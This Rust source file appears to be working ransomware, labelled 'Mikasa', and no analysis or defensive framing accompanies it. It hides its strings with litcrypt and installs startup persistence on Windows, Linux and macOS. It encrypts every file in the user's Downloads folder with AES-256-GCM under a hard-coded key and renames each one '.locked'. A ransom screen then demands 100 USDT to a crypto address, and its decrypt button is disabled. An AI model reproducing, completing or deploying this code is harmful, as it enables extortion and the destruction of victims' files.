#[macro_use]
extern crate litcrypt;

use std::env;
use std::fs::{self, File, OpenOptions, rename};
use std::io::{self, Read, Write};
use std::path::PathBuf;

use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{Aead, KeyInit, OsRng, rand_core::RngCore},
};
use eframe::egui::{self, Color32, FontId, RichText};
use eframe::{App, Frame};
use walkdir::WalkDir;

use epaint::{CornerRadius, Margin};

use_litcrypt!(lc!("dwNJSd344#@3(@)3dms"));

pub struct MikasaUI;

impl App for MikasaUI {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut Frame) {
        egui::CentralPanel::default()
            .frame(egui::Frame::default().fill(Color32::from_rgb(200, 0, 0)))
            .show(ctx, |ui| {
                ui.vertical_centered(|ui| {
                    ui.add_space(20.0);
                    ui.heading(
                        RichText::new(lc!("WARNING!"))
                            .size(45.0)
                            .color(Color32::WHITE)
                            .strong(),
                    );
                    ui.add_space(10.0);
                    ui.label(
                        RichText::new(lc!("Your system has been encrypted!"))
                            .color(Color32::WHITE)
                            .size(24.0),
                    );
                    ui.add_space(30.0);
                });

                egui::Frame::group(ui.style())
                    .fill(Color32::from_rgb(255, 80, 80))
                    .inner_margin(Margin::same(15))
                    .corner_radius(CornerRadius::same(10))
                    .show(ui, |ui| {
                        ui.vertical(|ui| {
                            ui.label(
                                RichText::new(lc!("What the HELL is it?"))
                                    .color(Color32::WHITE)
                                    .font(FontId::proportional(22.0))
                                    .strong(),
                            );
                            ui.label(
                                RichText::new(
                                    lc!("Some program encrypted your files: documents, music, pictures... They are now locked with strong encryption and can't be recovered without the key.")
                                )
                                .color(Color32::WHITE)
                                .size(16.0),
                            );
                        });
                    });

                ui.add_space(20.0);

                egui::Frame::group(ui.style())
                    .fill(Color32::from_rgb(255, 80, 80))
                    .inner_margin(Margin::same(15))
                    .corner_radius(CornerRadius::same(10))
                    .show(ui, |ui| {
                        ui.vertical(|ui| {
                            ui.label(
                                RichText::new(lc!("How can I recover my files?"))
                                    .color(Color32::WHITE)
                                    .font(FontId::proportional(22.0))
                                    .strong(),
                            );
                            ui.label(
                                RichText::new(lc!("Please send 100 USDT to the following address:"))
                                    .color(Color32::WHITE)
                                    .size(16.0),
                            );
                            ui.add_space(10.0);
                            ui.code(lc!("1HqYy3oB1c2nXNkL8XzvM3rF5TfESuK9uE"));
                            ui.add_space(15.0);
                            ui.label(
                                RichText::new(lc!("After payment, click the button below to start decryption."))
                                    .color(Color32::WHITE),
                            );

                            ui.add_enabled_ui(false, |ui| {
                                ui.add_sized([200.0, 40.0], egui::Button::new(lc!("Decrypt Files")));
                            });

                            ui.add_space(10.0);
                            ui.label(
                                RichText::new(
                                    lc!("MADE WITH LOVE BY HUMAN BEING ON EARTH")
                                )
                                .color(Color32::WHITE)
                                .italics(),
                            );
                        });
                    });

                ui.add_space(20.0);

                egui::Frame::group(ui.style())
                    .fill(Color32::from_rgb(120, 0, 0))
                    .inner_margin(Margin::same(10))
                    .corner_radius(CornerRadius::same(8))
                    .show(ui, |ui| {
                        ui.vertical(|ui| {
                            ui.label(
                                RichText::new(lc!("Sample of Encrypted Files"))
                                    .color(Color32::LIGHT_GRAY)
                                    .size(18.0)
                                    .strong(),
                            );
                            ui.separator();
                            ui.monospace(lc!("📄 resume.docx.locked"));
                            ui.monospace(lc!("🎵 anime_op.mp3.locked"));
                            ui.monospace(lc!("📷 vacation.jpg.locked"));
                            ui.monospace(lc!("📁 important.zip.locked"));
                            ui.monospace(lc!("🗃️ notes.txt.locked"));
                        });
                    });

                ui.add_space(30.0);
            });
    }
}

#[cfg(target_os = "windows")]
fn add_to_startup() {
    let exe_path = env::current_exe().unwrap();
    let startup_dir = dirs::config_dir()
        .unwrap()
        .join(lc!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
    let shortcut_path = startup_dir.join(lc!("network.bat"));

    let content = format!("start \"\" \"{}\"", exe_path.display());
    fs::write(&shortcut_path, content).expect("");
}

#[cfg(target_os = "linux")]
fn add_to_startup() {
    let exe_path = env::current_exe().unwrap();
    let autostart_dir = dirs::config_dir().unwrap().join(lc!("autostart"));
    fs::create_dir_all(&autostart_dir).unwrap();

    let desktop_file = autostart_dir.join(lc!("network.desktop"));
    let content = format!(
        lc!(
            "[Desktop Entry]\nType=Application\nExec={}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=My Rust App\n"
        ),
        exe_path.display()
    );

    fs::write(&desktop_file, content).expect("");
}

#[cfg(target_os = "macos")]
fn add_to_startup() {
    let exe_path = env::current_exe().unwrap();
    let plist_dir = dirs::home_dir().unwrap().join(lc!("Library/LaunchAgents"));
    fs::create_dir_all(&plist_dir).unwrap();

    let plist_path = plist_dir.join(lc!("com.network.startup.plist"));
    let content = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
        <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \
        \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
        <plist version=\"1.0\">\n<dict>\n\
        <key>Label</key><string>com.myapp.startup</string>\n\
        <key>ProgramArguments</key>\n<array>\n<string>{}</string>\n</array>\n\
        <key>RunAtLoad</key><true/>\n\
        </dict>\n</plist>\n",
        exe_path.display()
    );

    fs::write(&plist_path, content).expect("");
}

fn get_dir() -> Option<PathBuf> {
    dirs::home_dir().map(|path| path.join("Downloads"))
}

fn encrypt_file(path: &PathBuf, cipher: &Aes256Gcm) -> io::Result<()> {
    if let Some(file_name) = path.file_name().and_then(|n| n.to_str()) {
        if file_name.ends_with(".locked") {
            return Ok(());
        }
    }

    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let encrypted_data = cipher
        .encrypt(nonce, buffer.as_ref())
        .map_err(|_| io::Error::new(io::ErrorKind::Other, lc!("Encryption failed")))?;

    let mut out_file = OpenOptions::new().write(true).truncate(true).open(path)?;
    out_file.write_all(&nonce_bytes)?;
    out_file.write_all(&encrypted_data)?;
    out_file.flush()?;

    let mut new_path = path.clone();
    let new_file_name = format!(
        "{}.locked",
        path.file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("")
    );
    new_path.set_file_name(new_file_name);
    rename(path, &new_path)?;

    Ok(())
}

fn main() -> Result<(), eframe::Error> {
    add_to_startup();
    let key_str = String::from(lc!("g_w`:D2Xq6Yxez-5{#3mfd=VcB.Qhsub"));
    let key_bytes = key_str.as_bytes();
    let mut encryption_status = false;

    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(key_bytes);
    let cipher = Aes256Gcm::new(key);

    if let Some(home_dir) = get_dir() {
        for entry in WalkDir::new(home_dir).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path().to_path_buf();
            if path.is_file() && !path.extension().map_or(false, |ext| ext == "encrypted") {
                encryption_status = true;
                if let Err(e) = encrypt_file(&path, &cipher) {
                    eprintln!("{:?} {}", path, e);
                }
            }
        }
    }

    if encryption_status {
        let options = eframe::NativeOptions {
            viewport: egui::ViewportBuilder::default().with_inner_size([820.0, 700.0]),
            ..Default::default()
        };

        eframe::run_native(
            "MIKASA WARNING!",
            options,
            Box::new(|_cc| Ok(Box::new(MikasaUI))),
        )
    } else {
        Ok(())
    }
}
